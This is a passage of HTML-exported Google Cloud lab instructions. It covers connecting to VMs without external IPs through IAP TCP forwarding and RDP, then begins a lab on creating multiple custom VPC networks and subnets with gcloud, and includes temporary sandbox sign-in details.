address was found and that it will use IAP tunneling.</span></p><p><img src="images\%2BxgrSRTvVJbJdyJ3uLgKFkM6Dq81JAthRcPaJFFOH44%3D" referrerpolicy="no-referrer" alt="Output showing external IP address not found"></p><p><span>Update Putty Settings to allow Tunnel connections locally. Click the top left corner of the Putty Window &gt; Change Settings.</span></p><p><img src="images\9FEo0pSWmZRPXQja7crg43TFKtPtNi0e2ALxqSZ44qQ%3D" referrerpolicy="no-referrer" alt="Putty Settings"></p><p><span>Allow local ports to accept connections from other hosts by checking the checkbox &quot;Local ports accept connections from other hosts&quot;. </span><img src="images\J65cQl1VUnCd3NkkEruYxp2zSruQ1HnNzjelNWUynU0%3D" referrerpolicy="no-referrer" alt="Tunnel Settings"></p><ol start='' ><li><p><span>Close the Putty session and click </span><strong><span>Apply</span></strong><span>. Use the following command to create an encrypted tunnel to the RDP port of the VM instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute start-iap-tunnel windows-iap 3389 --local-host-port=localhost:0  --zone=us-east4-a</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Once you see the message about “Listening on port [XXX].” Copy the tunnel port number.</span></p><ol start='' ><li><p><span>Return to the Google Cloud Console and go to the </span><strong><span>Compute Engine &gt; VM Instances</span></strong><span> page.</span></p></li></ol><p><span>Set and copy the password for the </span><strong><span>windows-iap</span></strong><span> instance.</span></p><p><span>Return to the RDP session now.</span></p><p><span>Leave gcloud running and open the Microsoft Windows </span><strong><span>Remote Desktop Connection</span></strong><span> app.</span></p><p><span>Enter the tunnel endpoint where the endpoint is the tunnel port number from the earlier step like so:</span></p><ul><li><p><span>localhost:endpoint</span></p><p>&nbsp;</p></li></ul><p><span>Click </span><strong><span>Connect</span></strong><span>.</span></p><p><span>Then enter the previous credentials you copied earlier. You will be successfully RDPed into your instance now!</span></p><p><span>If prompted click </span><strong><span>Yes</span></strong><span>.</span></p><p><img src="\images\S%2BMwhPUkjzd1LkDzxOVJPtHbU3BcgpIyDtV2BWhDbk8%3D" referrerpolicy="no-referrer" alt="Windows 10 RDP instance page"></p><p><span>You were able to access the instance even without an external IP address using IAP</span></p><p><span>Confirm VM is accessible via IAP enabled SA</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p><span>Congratulations! You were able to successfully connect to both instances using IAP.</span></p><h2 id='congratulations-31'><span>Congratulations</span></h2><p><span>You learned how to use BeyondCorp Enterprise (BCE) and Identity-Aware Proxy (IAP) TCP forwarding by deploying 2 VM&#39;s, </span><code>windows-iap</code><span> and </span><code>linux-iap</code><span>, without IP addresses and configuring an IAP tunnel which gave you access to both instances using a third VM, </span><code>windows-connectivity</code><span>.</span></p><p>&nbsp;</p><h2 id='lab---multiple-vpc-networks'><span>LAB - Multiple VPC Networks</span></h2><h2 id='overview-35'><span>Overview</span></h2><p><span>Virtual Private Cloud (VPC) networks allow you to maintain isolated environments within a larger cloud structure, giving you granular control over data protection, network access, and application security.</span></p><p><span>In this lab you create several VPC networks and VM instances, then test connectivity across networks. Specifically, you create two custom mode networks (</span><strong><span>managementnet</span></strong><span> and </span><strong><span>privatenet</span></strong><span>) with firewall rules and VM instances as shown in this network diagram:</span></p><p><img src="images\OBtRY37ZCmWiHi%2FHsG8XCSGDBfsuKk3IMJVgQscsg2E%3D" referrerpolicy="no-referrer" alt="Network diagram"></p><p><span>The </span><strong><span>mynetwork</span></strong><span> network with its firewall rules and two VM instances (</span><strong><span>mynet-vm-1</span></strong><span> and </span><strong><span>mynet-vm-2</span></strong><span>) have already been created for you for this lab.</span></p><h2 id='objectives-23'><span>Objectives</span></h2><p><span>In this lab, you will learn how to perform the following tasks:</span></p><ul><li><p><span>Create custom mode VPC networks with firewall rules</span></p></li><li><p><span>Create VM instances using Compute Engine</span></p></li><li><p><span>Explore the connectivity for VM instances across VPC networks</span></p></li><li><p><span>Create a VM instance with multiple network interfaces</span></p></li></ul><h2 id='setup-and-requirements-31'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-18'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-13'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-00-56936274bf09@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Td8iY5FMBo8n</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='activate-cloud-shell-7'><span>Activate Cloud Shell</span></h3><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>qwiklabs-gcp-01-2d86450f8da2</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to qwiklabs-gcp-01-2d86450f8da2</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: student-00-56936274bf09@qwiklabs.net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-01-2d86450f8da2</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><h2 id='task-1-create-custom-mode-vpc-networks-with-firewall-rules'><span>Task 1. Create custom mode VPC networks with firewall rules</span></h2><p><span>Create two custom networks </span><strong><span>managementnet</span></strong><span> and </span><strong><span>privatenet</span></strong><span>, along with firewall rules to allow </span><strong><span>SSH</span></strong><span>, </span><strong><span>ICMP</span></strong><span>, and </span><strong><span>RDP</span></strong><span> ingress traffic.</span></p><h3 id='create-the-managementnet-network'><span>Create the managementnet network</span></h3><p><span>Create the </span><strong><span>managementnet</span></strong><span> network using the Cloud console.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>VPC networks</span></strong><span>.</span></p></li></ol><p><img src="images\TX50KUD1Lzj2j5YG3d07lXCbUxcxrmIso8g%2BSWZxNQA%3D" referrerpolicy="no-referrer" alt="Navigation menu"></p><ol start='' ><li><p><span>Notice the </span><strong><span>default</span></strong><span> and </span><strong><span>mynetwork</span></strong><span> networks with their subnets.</span></p><p><span>Each Google Cloud project starts with the </span><strong><span>default</span></strong><span> network. In addition, the </span><strong><span>mynetwork</span></strong><span> network has been premade as part of your network diagram.</span></p></li><li><p><span>Click </span><strong><span>Create VPC Network</span></strong><span>.</span></p></li><li><p><span>Set the </span><strong><span>Name</span></strong><span> to </span><code>managementnet</code><span>.</span></p></li><li><p><span>For </span><strong><span>Subnet creation mode</span></strong><span>, click </span><strong><span>Custom</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>managementsubnet-1</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>us-west1</code></td></tr><tr><td style='text-align:left;' ><span>IPv4 range</span></td><td style='text-align:left;' ><span>10.130.0.0/20</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>EQUIVALENT COMMAND LINE</span></strong><span>.</span></p><p><span>These commands illustrate that networks and subnets can be created using the Cloud Shell command line. You will create the </span><strong><span>privatenet</span></strong><span> network using these commands with similar parameters.</span></p></li><li><p><span>Click </span><strong><span>Close</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='test-completed-task-8'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully created a managementnet network, you will see an assessment score.</span></p><p><span>Create the managementnet network</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='create-the-privatenet-network'><strong><span>Create the privatenet network</span></strong></h3><p><span>Create the </span><strong><span>privatenet</span></strong><span> network using the Cloud Shell command line.</span></p><ol start='' ><li><p><span>Run the following command to create the </span><strong><span>privatenet</span></strong><span> network:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create privatenet --subnet-mode=custom</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command to create the </span><strong><span>privatesubnet-1</span></strong><span> subnet:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets create privatesubnet-1 --network=privatenet --region=us-west1 --range=172.16.0.0/24</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command to create the </span><strong><span>privatesubnet-2</span></strong><span> subnet:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; 